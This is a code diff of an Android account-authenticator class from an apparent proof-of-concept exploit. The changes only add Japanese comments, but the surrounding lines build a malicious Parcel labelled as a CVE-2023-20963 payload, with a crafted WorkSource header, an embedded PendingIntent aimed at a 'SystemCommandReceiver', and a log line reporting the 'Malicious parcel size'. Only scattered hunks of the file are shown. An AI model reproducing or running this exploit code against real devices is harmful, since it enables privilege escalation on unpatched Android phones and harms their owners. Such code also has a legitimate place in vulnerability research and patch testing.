@@ -12,7 +12,7 @@ import android.os.Bundle;
 import android.os.Parcel;
 
 public class MyAuthenticator extends AbstractAccountAuthenticator {
-    private final Context mContext;
+    private final Context mContext; // コンストラクタで受け取ったContextを保持
 
     public MyAuthenticator(Context context) {
         super(context);
@@ -37,7 +37,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
                 "com.example.tzpoc.SystemCommandReceiver"
         ));
         PendingIntent pendingIntent = PendingIntent.getBroadcast(
-                this.mContext,
+                this.mContext,  // ここで保持しているContextを使用
                 0,
                 intent,
                 PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
@@ -49,6 +49,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         Parcel dataParcel = Parcel.obtain();
         Parcel finalParcel = Parcel.obtain();
 
+        // WorkSource ヘッダー（CVE-2023-20963 ペイロード）
         dataParcel.writeInt(3);
         dataParcel.writeInt(13);
         dataParcel.writeInt(2);
@@ -88,7 +89,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
 
         int intentStartPos = dataParcel.dataPosition();
         dataParcel.writeString("intent");
-        dataParcel.writeInt(4);
+        dataParcel.writeInt(4); // PARCELABLE
         dataParcel.writeString("android.app.PendingIntent");
         dataParcel.appendFrom(pendingParcel, 0, pendingParcel.dataSize());
 
@@ -101,7 +102,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));
 
         finalParcel.writeInt(totalSize);
-        finalParcel.writeInt(0x4c444e42);
+        finalParcel.writeInt(0x4c444e42); // "BDNL"
         finalParcel.appendFrom(dataParcel, 0, totalSize);
         finalParcel.setDataPosition(0);
 
@@ -121,6 +122,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         return result;
     }
 
+    // その他のオーバーライド（空実装）
     @Override
     public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
         return null;
